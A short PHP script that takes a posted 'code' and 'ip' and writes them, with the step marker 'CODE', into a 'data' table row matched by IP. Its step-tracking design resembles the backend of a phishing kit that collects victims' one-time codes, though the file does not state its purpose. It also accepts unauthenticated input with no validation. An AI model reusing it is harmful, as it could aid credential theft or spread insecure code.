<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $code       = $_POST['code'];
    $ip  = $_POST['ip'];

    $data = [
        'code'         => $code,
        'step'          => 'CODE',
        'ip'            => $ip
    ];

    $db->where ('ip', $ip);
    $db->update ('data', $data);

    $db->disconnect();

}

?>